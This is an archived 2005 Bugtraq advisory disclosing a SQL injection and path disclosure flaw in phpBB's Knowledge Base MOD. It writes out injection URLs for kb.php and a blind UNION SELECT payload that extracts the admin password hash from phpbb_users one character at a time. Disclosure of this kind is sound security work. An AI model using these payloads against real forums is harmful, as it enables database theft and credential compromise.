=== Content from marc.info_9afa54e3_20250124_213321.html ===

```
[[prev in list](?l=bugtraq&m=111383708819580&w=2)] [[next in list](?l=bugtraq&m=111384254412001&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    phpBB - Knowledge Base MOD - SQL-Injection and Full Path Disclosure
From:       [<deluxe () security-project ! org>](?a=110782067400001&r=1&w=2)
Date:       [2005-04-18 15:24:37](?l=bugtraq&r=1&w=2&b=200504)
Message-ID: [20050418152437.8443.qmail () www ! securityfocus ! com](?i=20050418152437.8443.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=111384185116335&q=mbox) or [body](?l=bugtraq&m=111384185116335&q=raw)]

###########################################################
# phpBB - Knowledge Base MOD                              #
# SQL-Injection vulnerability and Full Path Disclosure    #
#                                                         #
# Discovered by [R] and deluxe89                          #
###########################################################

Discussion:
The phpbb - Knowledge Base MOD has a relatively hard to exploit SQL-Injection \
vulnerability. However, an attacker can exploit this bug and receive informations \
from the database.

The Bug:
The script doesn't filter the cat variable.
If we apply something wrong here:

/kb.php?mode=cat&cat='

We will get an error similar to this:

Could not obtain category data
DEBUG MODE
SQL Error : 1064 You have an error in your SQL syntax
SELECT * FROM phpbb_kb_categories WHERE category_id = \'
Line : 131
File : /here/is/the/full/path/functions_kb.php

/kb.php?mode=cat&cat=0+UNION+SELECT+0,0,0,0,0,0+FROM+phpbb_users+WHERE+1=0
No match: Categorie doesn't exist.

/kb.php?mode=cat&cat=0+UNION+SELECT+0,0,0,0,0,0+FROM+phpbb_users
Match: DEBUG MODE - SQL-Error

Therefor the only thing an attacker can find out is whether a row is matched or not.

Exploit:
The attacker may compare the informations in the database with test values. Example:

0+UNION+SELECT+0,0,0,0,0,0+FROM+phpbb_users+WHERE+user_id=2+AND+ascii(substring(user_password,1,1))=97

If it returns an SQL-Error, the first character of the hash is an 'a'.
Exploit available at the websites below.

Patch:
No patch available by now.

Greetz to madinfect, reddi, darkkilla, EaTh, Astovidatu and Doc

[www.security-project.org](http://www.security-project.org)
[www.batznet.com](http://www.batznet.com)

[[prev in list](?l=bugtraq&m=111383708819580&w=2)] [[next in list](?l=bugtraq&m=111384254412001&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


